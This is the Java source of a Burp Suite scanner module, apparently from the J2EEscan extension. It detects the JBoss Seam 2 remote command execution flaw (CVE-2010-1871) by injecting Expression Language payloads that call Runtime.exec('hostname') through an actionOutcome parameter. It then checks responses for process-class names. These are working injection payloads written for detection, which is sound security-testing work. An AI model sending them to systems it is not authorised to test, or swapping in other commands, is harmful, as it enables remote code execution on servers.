package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;

public class Seam2RCE implements IModule {

    private static final String TITLE = "JBoss Seam 2 Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a JBoss Seam Remote Command Execution vulnerability; "
            + "the SEAM library does not properly sanitize inputs for JBoss Expression Language (EL) expressions, "
            + "which allows remote attackers to execute arbitrary code on the remote system."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html<br />"
            + "http://blog.scotsts.com/2011/07/30/from-poc-to-shell-cve-2010-1871/<br />"
            + "https://access.redhat.com/security/cve/CVE-2010-1871";

    private static final String REMEDY = "Upgrade to the latest version of the SEAM framework.";

    private static final byte[] GREP_STRING_L = "java.lang.UNIXProcess".getBytes();
    private static final byte[] GREP_STRING_W = "java.lang.ProcessImpl".getBytes();

    // List of paths already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();
        byte[] rawRequest = baseRequestResponse.getRequest();

        // ?actionOutcome=
        if (curURL.getPath().contains(".seam")) {

            // Skip already tested resources
            //if (hs.contains(curURL.getPath())) {
            //    return issues;
            //}

            hs.add(curURL.getPath());

            
            // First test wihtout getDeclaredMethods indexes
            byte[] rawSimpleRequestSeam = helpers.addParameter(rawRequest,
                    helpers.buildParameter("actionOutcome",
                            "/pwd.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('hostname')}", IParameter.PARAM_URL)
            );
            IRequestInfo rawSimpleRequestSeamInfo = helpers.analyzeRequest(rawSimpleRequestSeam);
            List<String> headersSimpleRequestSeam = rawSimpleRequestSeamInfo.getHeaders();
            byte messageSimple[] = helpers.buildHttpMessage(headersSimpleRequestSeam, Arrays.copyOfRange(rawSimpleRequestSeam, rawSimpleRequestSeamInfo.getBodyOffset(), rawSimpleRequestSeam.length));
            IHttpRequestResponse respSimple = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), messageSimple);
            // look for matches of our active check grep string in the response body
            byte[] httpResponseSimple = respSimple.getResponse();
            List<int[]> matchesSimple_L = getMatches(httpResponseSimple, GREP_STRING_L, helpers);
            List<int[]> matchesSimple_W = getMatches(httpResponseSimple, GREP_STRING_W, helpers);

            if (matchesSimple_L.size() > 0 || matchesSimple_W.size() > 0) {

                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        reqInfo.getUrl(),
                        respSimple,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Certain
                ));

                return issues;
            }

            
            
            for (int i = 1; i <= 26; i++) {

                byte[] rawRequestSeam = helpers.addParameter(rawRequest,
                        helpers.buildParameter("actionOutcome",
                                "/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[" + i + "].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('hostname')}}", IParameter.PARAM_URL)
                );

                IRequestInfo rawRequestSeamInfo = helpers.analyzeRequest(rawRequestSeam);

                List<String> headers = rawRequestSeamInfo.getHeaders();
                byte message[] = helpers.buildHttpMessage(headers, Arrays.copyOfRange(rawRequestSeam, rawRequestSeamInfo.getBodyOffset(), rawRequestSeam.length));

                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);

                // look for matches of our active check grep string in the response body
                byte[] httpResponse = resp.getResponse();
                List<int[]> matches_L = getMatches(httpResponse, GREP_STRING_L, helpers);
                List<int[]> matches_W = getMatches(httpResponse, GREP_STRING_W, helpers);

                if (matches_L.size() > 0 || matches_W.size() > 0) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            reqInfo.getUrl(),
                            resp,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));

                    return issues;
                }

                // look for matches of our active check grep string in the http headers
                IResponseInfo responseInfo = helpers.analyzeResponse(httpResponse);

                for (String header : responseInfo.getHeaders()) {
                   if (header.substring(header.indexOf(":") + 1).trim().contains(helpers.bytesToString(GREP_STRING_L)) || header.substring(header.indexOf(":") + 1).trim().contains(helpers.bytesToString(GREP_STRING_W)) ) {
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                resp,
                                Seam2RCE.TITLE,
                                Seam2RCE.DESCRIPTION,
                                REMEDY,
                                Risk.High,
                                Confidence.Certain));

                        return issues;
                    }

                }
            }
        }

        return issues;
    }
}
